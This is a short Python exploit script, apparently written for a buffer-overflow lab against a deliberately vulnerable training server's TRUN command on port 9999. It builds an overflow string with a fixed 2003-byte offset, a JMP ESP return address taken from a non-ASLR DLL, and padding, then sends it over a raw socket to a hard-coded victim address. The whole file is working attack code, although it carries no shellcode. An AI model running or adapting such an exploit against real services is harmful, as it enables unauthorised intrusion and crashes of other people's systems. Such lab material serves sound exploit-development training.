import socket

victim_host = "10.0.2.4"
port = 9999

payload = "A" * 2003  # calculated buffer size
payload += "\xAF\x11\x50\x62"   # !mona jmp -r esp consigo la dirección DLLs compiled without ASLR
payload += "C" * 500  # padding to ensure a crash

buffer_exploit = "TRUN /.:/" + payload

expl = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
expl.connect((victim_host, port))
expl.send(buffer_exploit)

print("[x] Sent TRUN + malicious payload to the victim")
print("[!] You may need to send it multiple times")
expl.close()

